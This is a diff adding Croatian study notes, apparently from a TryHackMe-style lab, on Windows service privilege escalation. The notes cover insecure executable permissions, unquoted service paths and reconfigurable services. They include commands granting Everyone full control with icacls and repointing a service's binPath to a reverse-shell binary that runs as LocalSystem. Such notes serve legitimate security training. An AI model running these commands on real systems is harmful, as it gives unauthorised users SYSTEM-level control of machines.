@@ -1,0 +1,74 @@
+Service Control Manager
+Windows ima Service Control Manager (SCM) za managanje servisa.
+Kako bi dobili servisi i njihove informacije pisemo naredbu:
+
+sc [<ServerName>] qc [<ServiceName>]
+sc qc ServiceName
+C:\> sc qc apphostsvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: apphostsvc
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Application Host Helper Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : localSystem
+
+SERVICE_START_NAME je ime korisnika koji pokrece servis, a BINARY_PATH_NAME putanja u kojoj se nalazi servis.
+Sve informacije i konfiguracije servisa su spremljenje u HKLM\SYSTEM\CurrentControlSet\Services\
+Servisi imaju Discretionary Access Control List (DACL) koji sadrzi koji korisnik smije sto raditi tome procesu.
+
+Insecure Permissions on Service Executable
+Najjednostavnije objašnjeno, ovo se odnosi na servise gdje možemo promjeniti datoteku servisa gdje su pravila loše konfigurirana, tako da možemo promjeniti njen sadržaj.
+(Isto kao i u linuxu moramo dodati pravo izvršavanja, ili sva prava preko "icacls servis.exe /grant Everyone:F")
+I kada se doda pravo na izvrsavanje moramo zaustaviti i pokrenuti servis.
+
+C:\> sc stop windowsscheduler
+C:\> sc start windowsscheduler
+
+Unquoted Service Paths
+Ako postoji servis koji nema putanju do njega u navodnicima, mozemo 
+C:\> sc qc "disk sorter enterprise"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: disk sorter enterprise
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Disk Sorter Enterprise
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcusr2
+
+To znaci da bi servis prvo potražio servis na lokaciji C:\MyPrograms\Disk.exe i uzeo Sorter i enterprise\bin\disksrs.exe
+Ako ne pronađe datoteku Disk.exe na toj lokaciji ide dalje i pokusava izvrsiti C:\MyPrograms\Disk Sorter.exe sa argumentom Enterprise\bin\disksrs.exe
+Ako i to ne pronađe izvrsava datoteku na lokaciji C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe bez argumenata.
+Kako bi to mogli iskoristiti, pokušamo stvoriti datoteku na lokaciji C:\MyPrograms\ naziva Disk.exe ili C:\MyPrograms\Disk Sorter.exe kako bi ju mogli izvrsiti.
+
+Insecure Service Permissions
+Koristeci alat accesschk64.exe mozemo vidjeti informacije o servisima.
+
+C:\tools\AccessChk> accesschk64.exe -qlc thmservice
+  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_PAUSE_CONTINUE
+        SERVICE_START
+        SERVICE_STOP
+        SERVICE_USER_DEFINED_CONTROL
+        READ_CONTROL
+  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
+        SERVICE_ALL_ACCESS
+
+Vidimo da svi BUILTINT korisnici imaju pravo SERVICE_ALL_ACCESS, to znaci da imaju pravo rekonfigurirati servis.
+Mi cemo to korisitit tako da promjenimo putanju na koju servis pokazuje preko naredbe:
+
+C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem (obj specificicira u cije ime ce se racun vrtiti)
